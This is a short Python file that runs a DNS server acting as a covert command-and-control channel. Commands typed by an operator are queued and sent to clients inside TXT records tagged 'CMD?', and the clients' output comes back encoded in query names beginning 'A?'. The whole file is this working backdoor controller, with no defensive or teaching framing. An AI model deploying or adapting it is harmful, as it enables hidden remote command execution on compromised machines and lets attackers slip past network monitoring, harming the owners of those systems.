# Based on https://github.com/paulc/dnslib/blob/master/dnslib/fixedresolver.py
import copy
import queue
import threading
import time

import dnslib.server


cmds = queue.Queue()


def encode(cmd):
    return f'.   IN   TXT   "CMD?{cmd}"'


def collect_commands():
    time.sleep(2)
    while True:
        cmd = input('cmd: ')
        # nslookup hits twice.
        cmds.put(cmd)
        cmds.put(cmd)


class Resolver(dnslib.server.BaseResolver):

    def resolve(self, request, handler):

        name = str(request.q.qname)
        if name.startswith('A?'):
            response = name[2:-1].replace('%', ' ')
            print(f'\n\n--\n\n{response}\n\n--\n\ncmd: ', end = '')

        zone = ''
        try:
            cmd = cmds.get_nowait()
            zone = encode(cmd)
        except queue.Empty:
            pass

        self.rrs = dnslib.server.RR.fromZone(zone)
        reply = request.reply()
        qname = request.q.qname
        for rr in self.rrs:
            a = copy.copy(rr)
            a.rname = qname
            reply.add_answer(a)
        return reply


def main():
    threading.Thread(target=collect_commands).start()

    resolver = Resolver()
    logger = dnslib.server.DNSLogger('error')

    udp_server = dnslib.server.DNSServer(
        resolver,
        port=53,
        address='',
        logger=logger
    )

    udp_server.start_thread()

    while udp_server.isAlive():
        time.sleep(1)


if __name__ == '__main__':
    main()
